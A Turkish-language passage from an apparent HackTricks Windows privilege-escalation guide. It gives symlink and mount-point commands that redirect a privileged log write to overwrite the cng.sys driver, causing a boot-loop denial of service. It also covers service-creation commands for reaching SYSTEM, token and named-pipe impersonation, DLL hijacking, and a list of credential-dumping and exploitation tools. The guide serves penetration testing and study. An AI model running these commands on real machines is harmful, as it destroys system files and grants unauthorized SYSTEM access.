1. Ayrıcalıklı log hedefini bulmak için config dosyasını okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma artık `C:\Windows\System32\cng.sys` konumuna yapılır.
4. Üzerine yazılan hedefi inceleyerek (hex/PE parser) bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir service'in yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopyası varsa önce bu kopya denenebilir ve bozuk veriler için güvenilir bir DoS hedefi oluşturabilir.



## **High Integrity'den System'e**

### **Yeni service**

Zaten High Integrity seviyesinde çalışan bir process içindeyseniz, **SYSTEM'e giden yol** yeni bir service **oluşturup çalıştırarak** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary'si oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry anahtarları ve bir _.msi_ paketinin nasıl yükleneceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığından System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (muhtemelen bunları zaten High Integrity olan bir process'te bulursunuz), SeDebug ayrıcalığıyla **neredeyse tüm process'leri** (korumalı process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan bir process seçmek** için kullanılır (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan** [**bir kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde yükseltme yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından o pipe'a yazmak için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından **`SeImpersonate`** ayrıcalığını kullanarak pipe'ı oluşturan **server**, pipe istemcisinin (service'in) **token'ını taklit ederek** SYSTEM ayrıcalıklarını elde edebilir.\
[**Named pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Named pipe'lar kullanarak high integrity'den System'e geçiş örneğini okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir **dll'yi ele geçirebilirseniz**, o izinlerle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking, bu tür ayrıcalık yükseltmeleri için de kullanışlıdır. Ayrıca, dll'lerin yüklenmesi için kullanılan klasörlerde **yazma izinlerine** sahip olacağından, bu yöntemi **high integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiye** [**buradan ulaşabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tüm ayrıcalıklara

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binary'leri](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hatalı yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası bazı hatalı yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hatalı yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP'de kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration aracı**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hatalı yapılandırmaları aramak için host'u tarar (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hatalı yapılandırmaları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası hatalı yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderi temel alınarak oluşturulmuş araç (düzgün çalışmak için accesschk gerektirmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve işe yarayan exploit'ler önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve işe yarayan exploit'ler önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows'ta Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows'ta Yetki Yükseltme - kısa başvuru kılavuzu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni siyah (Rob Fuller ve Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Eksiksiz OSCP Kılavuzu](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Kılavuzu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows Yetki Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows'ta Yetki Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgesinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Açılan Bir Bağlantı: Windows'ta Symbolic Link'lerden Yararlanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Güven Sıçramaları: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi zorluklarının çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hizmet ikilisi kaçırma](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitifi](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Keyfi Dosya Silmelerinden Yararlanarak Yetki Yükseltme ve Diğer Harika Yöntemler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da Yerel Yetki Yükseltme 1-Day Açığı](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Görüntü Değişikliğinin Yetki Yükseltmeye Yol Açtığı Kerberos Kaynak Tabanlı Kısıtlanmış Delegasyonu](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Arka Kapı Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Yetki Yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Adımlarınızı NT AUTHORITY\SYSTEM'e Geri İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
